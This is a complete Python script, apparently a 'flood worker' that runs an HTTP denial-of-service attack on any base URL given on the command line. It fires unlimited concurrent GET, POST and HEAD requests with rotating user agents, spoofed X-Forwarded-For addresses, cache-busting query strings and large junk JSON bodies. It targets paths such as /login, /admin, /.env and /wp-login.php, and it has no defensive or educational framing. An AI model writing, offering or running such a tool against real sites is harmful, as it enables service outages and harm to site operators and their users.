#!/usr/bin/env python3
"""Standalone flood worker — runs in a separate process for multi-core attack."""

import asyncio
import json
import random
import string
import sys

import aiohttp

_c = string.ascii_letters + string.digits

UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5) AppleWebKit/605.1.15 Version/17.5 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/124.0.0.0",
]
PATHS = ["/", "/login", "/api/", "/admin", "/search", "/register",
         "/api/v1/users", "/dashboard", "/health", "/status",
         "/wp-login.php", "/xmlrpc.php", "/.env", "/config"]

_PAYLOADS = [
    json.dumps({
        "".join(random.choices(_c, k=8)): "".join(random.choices(_c, k=random.randint(3000, 8000)))
        for _ in range(random.randint(2, 4))
    }).encode()
    for _ in range(20)
]


def _h():
    return {
        "User-Agent": random.choice(UA),
        "Accept": "text/html,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "X-Forwarded-For": f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
    }


def _url(base):
    path = random.choice(PATHS)
    rnd = "".join(random.choices(_c, k=random.randint(8, 14)))
    key = "".join(random.choices(_c, k=random.randint(3, 6)))
    return f"{base}{path}?{key}={rnd}"


async def _fire(session, base):
    url = _url(base)
    m = random.choice(["GET", "POST", "HEAD"])
    try:
        if m == "POST":
            async with session.post(url, headers=_h(), data=random.choice(_PAYLOADS), ssl=False) as r:
                await r.read()
        elif m == "HEAD":
            async with session.head(url, headers=_h(), ssl=False) as r:
                pass
        else:
            async with session.get(url, headers=_h(), ssl=False) as r:
                await r.read()
    except Exception:
        pass


async def _do_one(sem, session, base):
    try:
        await _fire(session, base)
    finally:
        sem.release()


async def flood(base, concurrency):
    timeout = aiohttp.ClientTimeout(total=3, connect=2)
    conn = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, ssl=False, enable_cleanup_closed=True)
    session = aiohttp.ClientSession(connector=conn, timeout=timeout)
    sem = asyncio.Semaphore(concurrency)

    try:
        while True:
            await sem.acquire()
            asyncio.create_task(_do_one(sem, session, base))
    except (KeyboardInterrupt, asyncio.CancelledError):
        pass
    finally:
        await session.close()


def run_worker(base, concurrency):
    try:
        asyncio.run(flood(base, concurrency))
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: flood_worker.py <base_url> [concurrency]")
        sys.exit(1)
    base = sys.argv[1]
    conc = int(sys.argv[2]) if len(sys.argv) > 2 else 500
    run_worker(base, conc)
